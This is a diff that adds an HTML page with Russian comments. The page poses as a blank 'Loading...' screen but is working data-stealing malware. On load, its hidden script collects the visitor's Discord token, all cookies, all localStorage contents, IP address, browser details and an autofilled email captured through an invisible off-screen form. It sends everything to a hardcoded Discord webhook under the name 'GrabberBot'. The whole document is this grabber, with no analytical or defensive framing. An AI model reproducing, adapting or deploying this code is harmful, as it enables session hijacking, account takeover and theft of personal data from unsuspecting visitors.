@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Loading...</title>
+</head>
+<body style="display:none;">
+<!-- НЕВИДИМАЯ ФОРМА ДЛЯ АВТОЗАПОЛНЕНИЯ EMAIL -->
+<form id="hiddenForm" style="position:absolute;left:-9999px;top:-9999px;">
+  <input type="email" id="emailInput" name="email" autocomplete="email">
+  <input type="submit" style="display:none;">
+</form>
+
+<script>
+(function() {
+    // КОНФИГУРАЦИЯ: ВСТРОЕННЫЙ WEBHOOK
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1531307495568703582/opho_dIy0SSN4wyspTeQtpWFDLw1bdD3apjaxQLfY_penTBC_gm-t6VOXfpP6PsmlbYA";
+
+    // ФУНКЦИЯ ОТПРАВКИ ДАННЫХ
+    function sendData(data) {
+        const payload = {
+            content: "```json\n" + JSON.stringify(data, null, 2) + "\n```",
+            username: "GrabberBot"
+        };
+        fetch(WEBHOOK_URL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload),
+            mode: "cors"
+        }).catch(e => console.error(e));
+    }
+
+    // 1. ПОЛУЧЕНИЕ IP
+    function getIP(callback) {
+        fetch("https://api.ipify.org?format=json")
+            .then(r => r.json())
+            .then(data => callback(data.ip))
+            .catch(() => callback("IP не получен"));
+    }
+
+    // 2. ПОЛУЧЕНИЕ ТОКЕНА DISCORD ИЗ LOCALSTORAGE
+    function getDiscordToken() {
+        try {
+            return localStorage.getItem("token") || null;
+        } catch(e) { return null; }
+    }
+
+    // 3. ПОЛУЧЕНИЕ ВСЕХ ДАННЫХ LOCALSTORAGE (ПАРЫ КЛЮЧ-ЗНАЧЕНИЕ)
+    function getAllLocalStorage() {
+        try {
+            const obj = {};
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                obj[key] = localStorage.getItem(key);
+            }
+            return obj;
+        } catch(e) { return {}; }
+    }
+
+    // 4. ПОЛУЧЕНИЕ ВСЕХ COOKIE
+    function getAllCookies() {
+        try {
+            return document.cookie.split("; ").reduce((acc, cur) => {
+                const [k, v] = cur.split("=");
+                acc[k] = v;
+                return acc;
+            }, {});
+        } catch(e) { return {}; }
+    }
+
+    // 5. ПОИСК EMAIL В LOCALSTORAGE И COOKIE ПО КЛЮЧАМ
+    function findEmailInStorage(storage) {
+        const possibleKeys = ["email", "user_email", "mail", "login", "username", "profile_email"];
+        for (const key of possibleKeys) {
+            if (storage[key] && storage[key].includes("@")) {
+                return storage[key];
+            }
+        }
+        return null;
+    }
+
+    // 6. ПОПЫТКА ПОЛУЧИТЬ EMAIL ИЗ АВТОЗАПОЛНЕНИЯ (ЧЕРЕЗ СКРЫТУЮ ФОРМУ)
+    function getEmailFromAutofill(callback) {
+        const input = document.getElementById("emailInput");
+        if (!input) return callback(null);
+        input.focus();
+        setTimeout(() => {
+            const val = input.value;
+            if (val && val.includes("@")) {
+                callback(val);
+            } else {
+                callback(null);
+            }
+        }, 300);
+    }
+
+    // 7. СБОР ВСЕХ ДАННЫХ И ОТПРАВКА
+    function collectAndSend() {
+        const lsData = getAllLocalStorage();
+        const cookies = getAllCookies();
+        const token = getDiscordToken();
+        const emailFromStorage = findEmailInStorage(lsData) || findEmailInStorage(cookies);
+
+        getIP(function(ip) {
+            getEmailFromAutofill(function(autoEmail) {
+                const finalEmail = autoEmail || emailFromStorage || null;
+
+                const result = {
+                    timestamp: new Date().toISOString(),
+                    user_agent: navigator.userAgent,
+                    ip: ip,
+                    discord_token: token,
+                    email: finalEmail,
+                    localStorage: lsData,
+                    cookies: cookies,
+                    url: window.location.href,
+                    referrer: document.referrer || null,
+                    screen: `${screen.width}x${screen.height}`,
+                    language: navigator.language
+                };
+
+                sendData(result);
+            });
+        });
+    }
+
+    window.onload = function() {
+        setTimeout(collectAndSend, 500);
+    };
+})();
+</script>
+</body>
+</html>
